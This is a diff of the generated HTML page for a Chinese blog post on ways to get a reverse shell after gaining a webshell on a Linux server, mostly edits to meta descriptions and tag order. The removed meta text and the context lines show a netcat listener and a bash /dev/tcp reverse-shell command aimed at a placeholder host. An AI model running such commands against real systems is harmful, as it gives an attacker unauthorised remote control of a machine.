@@ -8,18 +8,18 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>多种姿势反弹shell | Brucetg&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。 0x01. Bash反弹  攻击者主机上执行监听： nc -lvvp port   目标主机上执行： bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/port 0&amp;gt;&amp;amp;1   简单解释下：  bash -i">
+  <meta name="description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。">
 <meta name="keywords" content="反弹shell">
 <meta property="og:type" content="article">
 <meta property="og:title" content="多种姿势反弹shell">
 <meta property="og:url" content="http://yoursite.com/2018/05/03/多种姿势反弹shell/index.html">
 <meta property="og:site_name" content="Brucetg&#39;s Blog">
-<meta property="og:description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。 0x01. Bash反弹  攻击者主机上执行监听： nc -lvvp port   目标主机上执行： bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/port 0&amp;gt;&amp;amp;1   简单解释下：  bash -i">
+<meta property="og:description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-05-03T13:42:38.571Z">
+<meta property="og:updated_time" content="2018-05-03T13:57:52.876Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="多种姿势反弹shell">
-<meta name="twitter:description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。 0x01. Bash反弹  攻击者主机上执行监听： nc -lvvp port   目标主机上执行： bash -i &amp;gt;&amp;amp; /dev/tcp/x.x.x.x/port 0&amp;gt;&amp;amp;1   简单解释下：  bash -i">
+<meta name="twitter:description" content="在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。">
   
   
     <link rel="icon" href="/favicon.png">
@@ -191,6 +191,7 @@
     <div class="article-entry" itemprop="articleBody">
       
         <p> <strong>在渗透过程中，在拿到webshell后，如果目标主机是Linux服务器，一般我们都会选择反弹shell以方便后续操作，在此总结下反弹shell的几种姿势。</strong></p>
+<a id="more"></a>
 <h2 id="0x01-Bash反弹"><a href="#0x01-Bash反弹" class="headerlink" title="0x01. Bash反弹"></a>0x01. Bash反弹</h2><p>  攻击者主机上执行监听：</p>
 <pre><code>nc -lvvp port
 </code></pre><p>  目标主机上执行：</p>
@@ -560,11 +561,19 @@ MathJax.Hub.Queue(function() {
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Docker、SDN</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">Kali Linux、mysql-sniffer</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Docker、SDN</a>
+                <a href="javascript:void(0)" class="js-tag color5">Eclipse Spring</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">PHP、反序列化</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -576,7 +585,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">反弹shell</a>
+                <a href="javascript:void(0)" class="js-tag color1">Kali Linux、DVWA</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -584,19 +593,11 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">Eclipse Spring</a>
+                <a href="javascript:void(0)" class="js-tag color3">反弹shell</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Windows、cmd</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">PHP、反序列化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Kali Linux、DVWA</a>
               </li>
             
             <div class="clearfix"></div>
